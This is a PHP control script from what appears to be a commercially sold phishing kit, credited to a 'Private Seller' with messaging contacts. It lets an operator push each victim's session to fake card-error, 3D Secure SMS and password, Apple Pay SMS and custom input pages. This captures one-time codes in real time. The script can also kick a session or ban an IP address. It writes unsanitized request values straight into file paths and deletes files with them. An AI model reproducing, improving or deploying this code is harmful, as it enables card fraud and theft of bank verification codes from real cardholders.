<?php
/*
Author : Private Seller
ICQ : @pseller200
https://t.me/pseller200
*/

function create_sure($path){
	do{
	$op = fopen($path,'w');
	fwrite($op,"");
	fclose($op);
		
	}while(!file_exists($path));
	
}


function create_result($path,$res){
	$op = fopen($path,'w');
	fwrite($op,$res);
	fclose($op);
	
}




if(isset($_GET['page'])){
	$id = $_GET['id'];
	$path = "../data/await/$id.page";
	if($_GET['page'] == "ecard"){
		create_sure($path);
		create_result($path,$_GET['page']);
		echo "CARD_ERROR_PAGE";
	}
	else if($_GET['page'] == "sms1"){
		create_sure($path);
		create_result($path,$_GET['page']);
		echo "3D_SMS_PAGE";
	}
	else if($_GET['page'] == "sms2"){
		create_sure($path);
		create_result($path,$_GET['page']);
		echo "3D_SMS_Password_PAGE";
	}else if($_GET['page'] == "sms3"){
		create_sure($path);
		create_result($path,$_GET['page']);
		echo "3D_Secoure_code_PAGE";
	}
	else if($_GET['page'] == "apple"){
		create_sure($path);
		create_result($path,$_GET['page']);
		echo "APPLE_PAY_SMS_PAGE";
	}
	else if($_GET['page'] == "eapple"){
		
		create_sure($path);
		create_result($path,$_GET['page']);
		echo "APPLE_PAY_SMS_ERROR_PAGE";
	}
	else if($_GET['page'] == "custom"){
		$path = "../data/await/$id.custom";
		create_sure($path);
		create_result($path,$_POST['customTXT']);
		echo "CustomInput_PAGE";
	}
	else if($_GET['page'] == "app"){
		create_sure($path);
		create_result($path,$_GET['page']);
		echo "APP_PAGE";
	}
	else if($_GET['page'] == "done"){
		create_sure($path);
		create_result($path,$_GET['page']);
		echo "DONE_PAGE";
	}else{
		
	}

}





// bot operations
if(isset($_GET['kick'])){
	
	$id = $_GET['id'];
	$path = "../data/await/$id.kick";
	create_sure($path);
	
	echo "KICKED";
	
}
else if(isset($_GET['ban'])){
	$ip = $_GET['ip'];
	$id = $_GET['id'];

	$result = "../data/ban.txt";
	$op = fopen($result,'a+');
	fwrite($op,"$ip\n");
	fclose($op);
	
	unlink("../data/await/$id");
	
	echo "BANNED - $ip";
	
	
}
else{
	
}






?>